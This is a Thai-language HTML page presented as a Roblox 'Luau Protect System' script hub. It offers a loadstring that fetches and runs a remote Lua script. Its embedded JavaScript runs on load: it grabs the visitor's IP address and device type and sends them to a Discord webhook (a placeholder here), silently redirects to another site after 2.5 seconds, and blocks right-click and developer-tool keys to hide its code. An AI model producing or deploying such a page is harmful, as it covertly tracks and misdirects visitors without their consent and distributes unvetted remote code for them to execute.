<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OFB Ultimate Hub - Luau Protect System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Consolas', 'Courier New', monospace;
        }
        body {
            background-color: #0a0a0f;
            color: #00ffcc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
            overflow: hidden;
        }
        .shield-box {
            background: #12121c;
            border: 2px solid #00ffcc;
            box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
            border-radius: 12px;
            padding: 25px;
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        h1 {
            color: #00ffcc;
            font-size: 22px;
            margin-bottom: 5px;
            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
        }
        .subtitle {
            color: #ff0055;
            font-size: 13px;
            margin-bottom: 15px;
            font-weight: bold;
        }
        .success-title {
            color: #00ffcc;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .info-box {
            background: #1a1a26;
            border: 1px dashed #00ffcc;
            padding: 10px;
            border-radius: 6px;
            font-size: 12px;
            color: #00ffcc;
            margin-bottom: 15px;
            text-align: left;
            line-height: 1.5;
        }
        .script-box {
            width: 100%;
            height: 100px;
            background: #08080c;
            border: 1px solid #00ffcc;
            border-radius: 8px;
            color: #00ffcc;
            padding: 10px;
            font-size: 13px;
            resize: none;
            outline: none;
            margin-bottom: 15px;
        }
        .copy-btn {
            width: 100%;
            background: #00ffcc;
            color: #0a0a0f;
            border: none;
            padding: 12px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
            transition: 0.2s;
        }
        .copy-btn:hover {
            background: #00cca3;
        }
        .middle-finger {
            font-size: 70px;
            margin: 10px 0;
            animation: pulse 0.5s infinite alternate;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            100% { transform: scale(1.15); }
        }
    </style>
</head>
<body>

    <div class="shield-box">
        <h1>OFB HUB SHIELD</h1>
        <div class="subtitle">[ LUAU PROTECT SYSTEM ]</div>
        
        <div class="success-title">SUCCESS !</div>
        <div class="info-box" id="userInfo">
            กำลังตรวจสอบอุปกรณ์และ IP...
        </div>

        <!-- ช่องใส่สคริปต์แบบเดิม -->
        <textarea class="script-box" readonly id="scriptText">loadstring(game:HttpGet("https://raw.githubusercontent.com/rapeepatatom-alt/ofb-The-ultimate/main/script.lua"))()</textarea>

        <!-- นิ้วกลางกวนๆ ก่อนวาร์ป -->
        <div class="middle-finger">🖕</div>

        <!-- ปุ่มคัดลอกแบบเดิม -->
        <button class="copy-btn" onclick="copyScript()">📋 คัดลอกสคริปต์</button>
    </div>

    <script>
        // ใส่ลิงก์ Discord Webhook ของลูกพี่ตรงนี้ (ถ้ามี)
        const webhookURL = "ใส่ลิงก์DiscordWebhookของลูกพี่ตรงนี้";

        // ฟังก์ชันดึง IP และส่งเข้า Discord อัตโนมัติทันทีที่เข้าเว็บ
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                const ua = navigator.userAgent;
                let device = "PC / Unknown";
                
                if (/android/i.test(ua)) device = "Android Device";
                else if (/iphone|ipad|ipod/i.test(ua)) device = "iOS Device";
                else if (/windows/i.test(ua)) device = "Windows PC";

                document.getElementById('userInfo').innerHTML = 
                    `🌐 <b>IP Address:</b> ${ip}<br>📱 <b>Device:</b> ${device}`;

                // ยิงข้อมูลเข้า Discord Webhook
                if (webhookURL && webhookURL.startsWith("http")) {
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `🚨 **มีคนกดเข้าเว็บ OFB แล้วไอสัส!**\n🌐 **IP:** ${ip}\n📱 **Device:** ${device}`
                        })
                    }).catch(err => console.log(err));
                }
            })
            .catch(() => {
                document.getElementById('userInfo').innerHTML = `🌐 <b>IP Address:</b> Protected`;
            });

        // ฟังก์ชันปุ่มคัดลอกสคริปต์
        function copyScript() {
            const scriptText = document.getElementById('scriptText');
            scriptText.select();
            document.execCommand('copy');
            alert('คัดลอกสคริปต์เรียบร้อยแล้ว!');
        }

        // หน่วงเวลา 2.5 วินาทีให้เห็นหน้าเว็บแล้วเด้งไปเป้าหมายแบบเงียบๆ
        setTimeout(function() {
            window.location.href = "https://jonathanbassedas.github.io/halloween/?fbclid=PAT01DUAUx2fNleHRuA2FlbQIxMABwZG9mAnNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp0aFNPxW06myDtPR_ZSIU4qwPmFdYQTiE6aSCePjat2jBpx4qYSEpmHYYrzs_aem_0DUYjEMtNcSEIdSNDLjj5w";
        }, 2500);

        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                e.preventDefault();
                return false;
            }
        });
    </script>

</body>
</html>
